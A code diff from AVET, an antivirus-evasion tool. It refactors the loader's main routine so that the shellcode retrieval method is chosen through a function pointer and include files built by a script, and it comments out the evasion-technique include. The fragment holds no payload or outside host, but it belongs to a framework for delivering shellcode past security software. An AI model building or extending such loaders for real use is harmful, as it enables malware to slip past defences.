@@ -33,18 +33,27 @@ Web: https://github.com/govolution/avet
 // Include shellcode binding technique to be used here
 #include "shellcode_binding.h"
 
-// Include shellcode retrieval method to be used here
-#include "get_shellcode.h"
+// Include file that contains the implementation of the selected get_shellcode method
+// The included file is assembled by the build script
+#include "get_shellcode/get_shellcode.include"
 
 
 int main (int argc, char **argv)
 {		
 	// Include evasion techniques to be used here
-	#include "techniques.h"	
+	//#include "evasion.h"	
 	
+	// --- RETRIEVE SHELLCODE ---
+	// This function pointer should be used in the main executable to store the data_retrieval function that will be used for fetching the shellcode.
+	unsigned char *(*get_shellcode)(char *, int *);
+	
+	// Include C code that actually assigns the desired data_retrieval method to the get_shellcode function.
+	// The included file is assembled by the build script
+	#include "get_shellcode/get_shellcode.assign"
+		
 	// Retrieve shellcode
 	int shellcode_size = 0;	
-	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);	
+	unsigned char *shellcode = get_shellcode(argv[1], &shellcode_size);	
 	
 	// Decode shellcode
 	//void decode_shellcode(const unsigned char *ciphertext, unsigned char *plaintext, const int ciphertext_length, const unsigned char key)
